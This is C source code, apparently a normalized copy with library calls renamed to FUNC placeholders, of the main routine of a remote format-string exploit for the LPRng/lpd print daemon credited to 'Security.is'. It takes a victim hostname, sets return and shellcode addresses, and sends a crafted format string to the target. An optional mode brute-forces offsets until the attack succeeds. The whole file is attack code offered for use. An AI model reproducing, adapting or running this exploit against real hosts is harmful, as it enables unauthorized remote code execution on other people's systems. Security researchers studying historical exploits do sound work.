#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  exploit_buffer ;
struct TYPE_2__ {int eip_address; int shellcode_address; int align; int position; char* os_name; void* written_bytes; } ;

/* Variables and functions */
 int EOF ; 
 int OFFSET_LIMIT ; 
 int SHELLCODE_COUNT ; 
 int /*<<< orphan*/  address_buffer ; 
 void* FUNC0 (int /*<<< orphan*/ ) ; 
 int brute ; 
 char* FUNC1 () ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 scalar_t__ failure ; 
 int /*<<< orphan*/ * FUNC3 (char*) ; 
 int FUNC4 (int,char**,char*) ; 
 int /*<<< orphan*/ * he ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 char* hostname ; 
 int /*<<< orphan*/  FUNC6 (char*,char,int) ; 
 int offset ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  FUNC7 (char*,...) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 int /*<<< orphan*/  FUNC9 (char*,char*) ; 
 int /*<<< orphan*/  FUNC10 (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC11 (char*,char*,int) ; 
 void* FUNC12 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int) ; 
 TYPE_1__* targets ; 
 size_t type ; 
 int /*<<< orphan*/  FUNC13 (char*) ; 

int FUNC14(int argc, char **argv)
{
 
   char exploit_buffer[1024];
   char *format = NULL;
   int c, brutecount=0;



if(argc < 3)
  {
    FUNC13(argv[0]);
    return 1;
 }

      hostname = argv[1];

if(!FUNC11(argv[2], "brute", 5)) brute = 1;

   
      while(( c = FUNC4 (argc, argv, "t:r:c:a:o:p:w:k"))!= EOF){

      switch (c)
        {

         case 't':
            type = FUNC0(optarg);
            break;
      
         case 'r':
            targets[type].eip_address = FUNC12(optarg, NULL, 16);
            break;

         case 'c':
            targets[type].shellcode_address = FUNC12(optarg, NULL, 16);
            break;

         case 'a':
            targets[type].align = FUNC0(optarg);
            break;

         case 'o':
            offset = FUNC0(optarg);
            break;

         case 'p':
            targets[type].position = FUNC0(optarg);
            break;

         case 'w':
            targets[type].written_bytes = FUNC0(optarg);
            break;

        default:
          FUNC13(argv[0]);
          return 1;
        }
   }

       if(type < 0) 
         {
	   FUNC7("You must specify a type!\n");
	   FUNC7("example: ./SEClpd victim -t 0\n");
	   return -1;
        }

   if ( (he = FUNC3 (hostname)) == NULL)
   {
     FUNC5("gethostbyname");
     FUNC2(1);
   }

  targets[type].shellcode_address = targets[type].eip_address + SHELLCODE_COUNT;

   
   FUNC7("+++ Security.is remote exploit for LPRng/lpd by DiGiT\n\n");   

   FUNC7("+++ Exploit information\n");
   FUNC7("+++ Victim: %s\n", hostname);
   FUNC7("+++ Type: %d - %s\n", type, targets[type].os_name);  
   FUNC7("+++ Eip address: 0x%x\n", targets[type].eip_address); 
   FUNC7("+++ Shellcode address: 0x%x\n", targets[type].shellcode_address); 
   FUNC7("+++ Position: %d\n", targets[type].position);
   FUNC7("+++ Alignment: %d\n", targets[type].align);
   FUNC7("+++ Offset %d\n", offset);
   FUNC7("\n");

   FUNC7("+++ Attacking %s with our format string\n", hostname);

if( brute > 0 )
 {

  FUNC7("+++ Brute force man, relax and enjoy the ride ;>\n");
   targets[type].eip_address =  0xbffffff0;

 while(failure) 
 
  {
	FUNC6(exploit_buffer, '\0', sizeof(exploit_buffer)); 

   format = FUNC1();
   FUNC10(exploit_buffer, address_buffer);
   FUNC9(exploit_buffer, format);
   FUNC9(exploit_buffer, "\n");
   FUNC8(exploit_buffer);

	targets[type].eip_address = 0xbffffff0 - offset;

  offset+=4;

    if (offset > OFFSET_LIMIT) {
        FUNC7("+++ Offset limit hit, ending brute mode ;<\n");
        return -1;

       }
    }
}


else

   format = FUNC1();
   FUNC10(exploit_buffer, address_buffer);
   FUNC9(exploit_buffer, format);
   FUNC9(exploit_buffer, "\n");
   FUNC8(exploit_buffer);

	FUNC7("Argh exploit failed$#%! try brute force!\n"); 

   return (-1);
}